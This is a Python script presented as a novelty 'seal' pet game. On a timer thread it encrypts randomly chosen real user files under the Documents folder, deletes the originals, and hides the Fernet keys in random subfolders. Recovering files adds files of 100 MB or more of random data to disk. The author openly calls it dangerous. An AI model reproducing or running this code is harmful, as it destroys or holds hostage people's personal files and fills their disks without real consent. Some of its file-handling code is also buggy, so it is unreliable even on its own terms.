import os
import pickle
from cryptography.fernet import Fernet
import random
import uuid
from playsound import playsound
import time
import threading
import getpass

# As part of a recent desire to make anti-markatable software I developed this pointlessly dangerous and sadomasochistic "game" (hire me please!)

class Game_State():
    def __init__(self):
        self.food_names = ['squid', 'crustacean', 'mollusc', 'rockfish', 'herring', 'flounder', 'salmon', 'hake', 'sandlance']
        self.to_search = f'/Users/{getpass.getuser()}/Documents' # change to os.getcwd() to scan the current directory
        self.dirname = os.path.dirname(__file__)
        self.file_extension_type = ('.png', '.jpg', '.pdf', '.txt', '.docx', '.mp3', '.mp4') # change depending on what file types to encrypt
        self.file_paths_encrypted = []
        self.encrypt_count = 0
        self.seal_happiness = 30
        self.program_running = True
        self.is_waiting_for_food = False
        self.is_encrypting = False
        self.points = 0
        self.time_multiplier = 30 # change to reflect game speed
        self.time_to_do_action = time.time() + (self.seal_happiness * self.time_multiplier) 
        self.all_filepaths = [entry for entry in os.scandir(self.to_search) if not entry.name.startswith('.') and entry.is_dir()]

G = Game_State()

# generate key and save it
def generate_key():
    key_to_save = Fernet.generate_key()
    food = f'{random.choice(G.food_names).upper()}-{uuid.uuid4()}'
    filepath = os.path.join(random.choice(G.all_filepaths).path, f'{food}.tastyfish')
    file = open(filepath, 'wb')
    file.write(key_to_save)
    file.close()
    return key_to_save

def encryption_succ(count):
    G.is_waiting_for_food = True
    print(f"Your seal is hungry! Feed it before it gets hungrier. It has just encrypted {count} file{'s!' if count > 1 else '!'}")
    playsound('bark.wav')
    if G.seal_happiness >= 3:
        G.seal_happiness -= 2

def encrypt():
    # if already encrypting, don't encrypt
    if not G.is_encrypting:
        print('The seal is hungry and has started to encrypt...')
        G.is_encrypting = True
        G.encrypt_count = 0
        max_files_to_encrypt = random.randrange(5, 10)
        for root, dirs, files in os.walk(G.to_search):
            if (G.encrypt_count >= max_files_to_encrypt):
                break
            for file in files:
                if file.endswith(G.file_extension_type) and (random.random() <= 0.3):
                    data = open(os.path.join(root, file), 'rb').read()
                    fernet = Fernet(generate_key())
                    output_file = fernet.encrypt(data)
                    file_name, file_extension = os.path.splitext(file)
                    open((root + '/' + file_name + '.sealEncrypted'), 'wb').write(output_file)
                    G.file_paths_encrypted.append({ "path_and_file": root + '/' + file_name, "extension": file_extension })
                    os.remove(os.path.join(root, file))
                    G.encrypt_count += 1
        to_write = {
            "points": G.points,
            "content": G.file_paths_encrypted
        }
        with open('SEALED.seal', 'wb') as filehandle:
            pickle.dump(to_write, filehandle)
        G.is_encrypting = False
        if G.encrypt_count > 0:
            encryption_succ(G.encrypt_count)

def take_a_crap(size):
    filepath = os.path.join(G.dirname, f'FEED_ME/SEAL_CRAP')
    # check if there is a crap file
    try:
        file_content = open(filepath, 'rb')
        file = open(filepath, 'wb')
        file.write(file_content + os.urandom(1024 * 1024 * 100 * size))
        file.close()
    except:
        file = open(filepath, 'wb')
        file.write(os.urandom(1024 * 1024 * 100 * size))
        file.close()

def decrypt():
    succ_decrypted = 0
    try:
        open('SEALED.seal', 'rb')
    except:
        print('Error: no SEALED file...')
        quit()

    # get encrypted filepaths
    with open('SEALED.seal', 'rb') as filehandle:
        loaded_files = pickle.load(filehandle)
        G.file_paths_encrypted = loaded_files["content"]

    if len(G.file_paths_encrypted) < 1:
        return

    # decrypt files in the filepaths using the keys placed in the FEED_ME folder
    filename = os.path.join(G.dirname, 'FEED_ME')
    for data in list(G.file_paths_encrypted):
        for root, dirs, files in os.walk(filename):
            for f in files:
                file = open(filename + '/' + f, 'rb')
                key = file.read()
                try:
                    the_data = open(data["path_and_file"] + '.sealEncrypted', 'rb').read()
                    fernet = Fernet(key)
                    output_file = fernet.decrypt(the_data)
                    open(data["path_and_file"] + data["extension"], 'wb').write(output_file)
                    os.remove(data["path_and_file"] + '.sealEncrypted')
                    os.remove(filename + '/' + f)
                    G.file_paths_encrypted.remove(data)

                    print(f'Decrypted: [{data["path_and_file"]}{data["extension"]}]')
                    
                    succ_decrypted += 1
                except:
                    None

    # save the results
    if succ_decrypted > 0:
        to_write = {
        "points": G.points + succ_decrypted,
        "content": G.file_paths_encrypted
        }
        with open('SEALED.seal', 'wb') as filehandle:
            pickle.dump(to_write, filehandle)
        print('The seal is eating and digesting the food...')
        take_a_crap(succ_decrypted)

        # reset timer for the next encryption
        G.time_to_do_action = time.time() + (G.seal_happiness * G.time_multiplier)

        decrypt_succ(succ_decrypted)
    else:
        print('Your seal was not fed properly...')
        anger_seal()

def decrypt_succ(files_decrypted):
    G.is_waiting_for_food = True
    print(f"\n{files_decrypted} file{'s ' if files_decrypted > 1 else ' '}successfully decrypted!")
    print('The seal enjoyed eating.')
    G.seal_happiness += 2
    G.time_to_do_action += (2 * G.time_multiplier)
    playsound('eating.wav')

def anger_seal():
    print('You have angered your seal...')
    if G.seal_happiness >= 6:
        G.seal_happiness -= 5
        G.time_to_do_action -= (5 * G.time_multiplier)
    playsound('angry.wav')

def print_stats():
    files_display = len(G.file_paths_encrypted)
    print(files_display, f"file{'s ' if (files_display > 1 or files_display < 1) else ' '}currently encrypted!")
    G.is_waiting_for_food = (True if files_display > 0 else False)
    print(f"You currently have {G.points} points")
    if files_display:
        print(f"The seal is hungry! It has currently encrypted {files_display} file{'s ' if files_display > 1 else ' '}with its hunger!")
    else:
        print('')

def check_is_dirty():
    # go through FEED_ME folder and check if there are any SEAL_CRAP files
    filepath = os.path.join(G.dirname, f'FEED_ME/SEAL_CRAP')
    return True if os.path.exists(filepath) else False

def interact():
    talk = input('Seal interaction terminal: ').lower()
    if 'exit' in talk:
        if G.is_encrypting:
            print('Your seal is currently encrypting files. Best let them finish first...')
            return interact()
        G.program_running = False
        print('Goodbye!')
        # save remaining points
        to_write = {
            "points": G.points,
            "content": G.file_paths_encrypted
        }
        with open('SEALED.seal', 'wb') as filehandle:
            pickle.dump(to_write, filehandle)
        quit()
    elif 'feed' in talk:
        if check_is_dirty():
            print("Your seal doesn't want to eat. Its feeding area is too dirty!")
            anger_seal()
            return interact()
        decrypt()
    elif 'play' in talk:
        print("You have played with your seal!")
        if G.seal_happiness < 40:
            G.seal_happiness += 2
            G.time_to_do_action += (2 * G.time_multiplier)
            print("The seal enjoyed being played with.......")
    elif 'clean' in talk:
        if check_is_dirty():
            os.remove(os.path.join(G.dirname, 'FEED_ME/SEAL_CRAP'))
            print("The seal's feeding quarters are clean now...")
        else:
            print("The seal's feeding quarters are already clean...")
    elif 'stats' in talk:
        print_stats()
        print(f"Your seal's happiness levels are: {G.seal_happiness}/50")
    elif 'billy corgan' in talk:
        print('The seal hates Billy Corgan...')
        anger_seal()
    interact()

def thread_schedule():
    while G.program_running:
        time.sleep(1)
        if not G.is_waiting_for_food:
            G.points += 1
        if int(time.time()) >= G.time_to_do_action:
            encrypt()
            G.time_to_do_action = time.time() + (G.seal_happiness * G.time_multiplier)
    quit()

# ----- Game starts here -----
# check if there is a save file. Create one if there isn't.
try:
    # load previous encrypted filepaths and points
    with open('SEALED.seal', 'rb') as filehandle:
        loaded_files = pickle.load(filehandle)
        G.points = loaded_files["points"]
        G.file_paths_encrypted = loaded_files["content"]
except:
    # if there is no save file, create one
    to_write = {
        "points": G.points + G.encrypt_count,
        "content": G.file_paths_encrypted
    }
    with open('SEALED.seal', 'wb') as filehandle:
        pickle.dump(to_write, filehandle)

# check if a FEED_ME folder exists
feed_path = os.path.join(G.dirname, 'FEED_ME')
if not os.path.isdir(feed_path):
    os.mkdir(feed_path)

#! make it so that you can choose either the coward or hero's path
input("Welcome. Please press ENTER to begin")
print_stats()

schedule_thread = threading.Thread(target=thread_schedule)
schedule_thread.start()

interact()